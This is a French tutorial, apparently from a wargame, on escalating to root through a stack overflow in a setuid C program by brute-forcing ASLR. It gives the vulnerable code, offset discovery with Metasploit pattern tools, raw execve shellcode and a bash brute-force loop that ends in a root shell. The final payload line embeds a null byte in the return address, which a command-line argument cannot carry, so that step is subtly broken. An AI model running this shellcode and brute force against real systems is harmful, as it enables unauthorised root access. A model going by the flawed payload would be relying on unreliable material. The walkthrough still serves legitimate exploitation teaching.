# Le Stack Overflow avec ASLR

## I. Introduction
Nous allons voir la technique la plus simple pour executer un shellcode malgré la présence de la protection ASLR.

## II. Pré-requis
* Un programme suid
* Un code permettant le buffer overflow

Soit le programme `vuln` suivant :
```{r, engine='C'}
#include <stdio.h>
#include <string.h>

void hello(char * src)
{
        char buffer[64];

        strcpy(buffer, src); /* Buffer overflow */
        printf("Hello %s !\n", buffer);
}

int main(int argc,char * argv[])
{
        if(argc<2)
		return -1;

        hello(argv[1]);

        return 0;
}
```

## III. La faille
Ce programme permet un stack overflow classique car l'input utilisateur est recopié en mémoire sans vérification (`strcopy()`). Ceci étant, la randomization de la mémoire fait que notre shellcode sera placé à des adresses mémoires différentes à chaque execution du programme vulnérable.  
Mais, les différentes adresses de notre shellcode reste tout de même dans le même secteur : elles sont prédictibles. Une technique serait de choisir une adresse et de tenter x fois de lancer le programme jusqu'à ce que notre adresse pointe sur des NOP de notre shellcode... On va donc bruteforcer.

## IV. Exploitation

### On détermine l'offset de l'adresse de retour
Pour cela, on génère on suite de caractère unique sur kali :
```{r, engine='bash'}
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```
On execute notre programme vulnérable sous le debugger `gdb`
```{r, engine='bash'}
aas@ubuntu:~$ gdb -q ./vuln
Reading symbols from /wargame/medium/level1/level...(no debugging symbols found)...done.
gdb$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Votre argument est : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
Cannot access memory at address 0x63413563
0x63413563 in ?? ()
```
Kali va maintenant nous dire à l'octet près là où nous pouvons réécrire l'adresse de retour
```{r, engine='bash'}
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb $(ruby -e 'print "\x63\x41\x35\x63".reverse')
[*] Exact match at offset 76
```

### Construction de l'input
Faisons ça comme pour un stackoverflow classique :
`JUNK + EIP + NOPs + SHELLCODE``
```{r, engine='bash'}
aas@ubuntu:~# gdb -q ./vuln
Reading symbols from /wargame/medium/level1/level...(no debugging symbols found)...done.
gdb$ r `python -c 'print "A"*76 + "BBBB" + "\x90"*1000 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'`
gdb$ x/100x $esp
0xbf98fdd0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf98fde0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf98fdf0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf98fe00:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf98fe10:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf98fe20:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf98fe30:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf98fe40:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf98fe50:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf98fe60:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf98fe70:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf98fe80:	0x90909090	0x90909090	0x90909090	0x90909090
...
```
Choisissons 0xbf98fe00 comme @eip.


### Bruteforce
Une simple boucle for nous permet de réaliser notre bruteforce :

```{r, engine='bash'}
aas@ubuntu:~$ for i in {1..25000}; do echo Try: $i && ./level `python -c 'print "A"*76 + "\x00\xfe\x98\xbf" + "\x90"*1000 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'` && break ; clear ; done ;
Try: 1
Try: 2
...
Try: 
# whoami
root
```

Nous accédons au shell root. C'est une méthode de boeuf, mais elle reste simple et plutôt efficace.